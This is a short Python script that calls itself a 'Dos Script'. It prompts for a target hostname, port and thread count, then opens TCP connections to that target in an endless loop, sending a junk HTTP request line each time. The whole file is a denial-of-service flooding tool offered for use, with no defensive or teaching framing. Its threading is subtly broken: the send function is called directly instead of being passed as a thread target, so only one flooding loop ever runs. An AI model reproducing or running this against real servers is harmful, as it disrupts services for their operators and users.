import socket
import threading

def tmp():
    print("coming...\n")
def send(host,port):
    while True:    
        packet="GET test HTTP/1.1 \r\n"
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((host,port))
            s.send(str.encode(packet))
        except socket.error:
            print("Socket Error!\n")
        s.close()
def main():
    print("Executing Dos Script\n")
    Host=str(input("Please enter the Hostname\n"))
    Port=int(input("Please enter the Port\n"))
    thread_c=int(input("How many threads do u want to start?\n"))
    for i in range(thread_c):
        t= threading.Thread(target=send(Host,Port))
        t.start()

if __name__=="__main__":
    main()